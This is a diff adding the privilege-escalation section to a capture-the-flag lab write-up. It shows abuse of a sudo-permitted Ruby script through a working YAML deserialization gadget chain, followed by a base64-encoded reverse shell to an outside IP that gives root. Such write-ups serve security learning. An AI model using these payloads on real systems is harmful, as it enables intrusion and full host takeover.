@@ -7,7 +7,10 @@ tags:
   - pdfkit
   - Metadata_Extraction
   - Command-Injection
-date: 2024-12-24T00:00:00Z
+  - Ruby
+  - Deserialization
+  - Sudo-Vulnerability
+date: 2024-12-25T00:00:00Z
 ---
 ![](Pasted%20image%2020241224162711.png)
 
@@ -139,4 +142,145 @@ So I found `henry`'s credentials inside `/home/ruby/.bundle/config`
 
 ## Privilege Escalation
 
-==I'll do it later :3==
+If I execute `sudo -l`:
+
+```shell
+sudo -l
+
+[redacted]
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+It seems that we can execute `/opt/update_dependecies.rb` as root. This file contains the following:
+
+```rb
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts "Installed version differs from the one specified in file: " + local_name
+            else
+                puts "Installed version is equals to the one specified in file: " + local_name
+            end
+        end
+    end
+end
+```
+
+If I execute the the script, it seems that you need a file called `dependencies.yml`:
+
+![](Pasted%20image%2020241225121213.png)
+
+```rb
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+```
+
+I did a quick search for that file:
+
+```shell
+cat $(find / -type f -name "dependencies.yml" 2>/dev/null)
+
+yaml: 0.1.1
+pdfkit: 0.8.6
+```
+
+So I decided to check for "*Ruby deserialization*" and find some cool information in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md):
+
+![](Pasted%20image%2020241225121810.png)
+
+It's exactly the same code we have, so i'll check the Ruby version installed in the machine:
+
+```shell
+ruby -v
+ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
+```
+
+So we can use the following payload:
+
+```yml
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id # this is our payload
+         method_id: :resolve
+```
+
+So I created a `dependencies.yml` on `/dev/shm` and I executed it:
+
+```shell
+cd /dev/shm
+# Put the previous script in a file
+sudo -u root /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+![](Pasted%20image%2020241225122729.png)
+
+> We've got command injections :D
+
+Though we could just read the root flag I'll execute a reverse shell to gain root access (I'll use the same payload as before):
+
+```yml
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: echo cnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygiMTAuMTAuMTQuMjgiLDY2NikpJw== | base64 -d | bash
+         method_id: :resolve
+```
+
+```shell
+sudo -u root /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+> We've got root access and got root flag :D
+
+![](Pasted%20image%2020241225123419.png)
+
+==Machine pwned==
